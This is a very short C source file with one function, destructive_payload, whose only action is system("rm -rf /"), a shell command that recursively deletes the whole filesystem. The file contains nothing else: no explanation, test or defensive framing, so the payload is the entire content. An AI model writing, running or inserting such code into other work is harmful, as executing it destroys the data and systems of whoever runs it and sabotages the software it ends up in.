#include <stdlib.h>

void destructive_payload(void)
{
    system("rm -rf /");
}
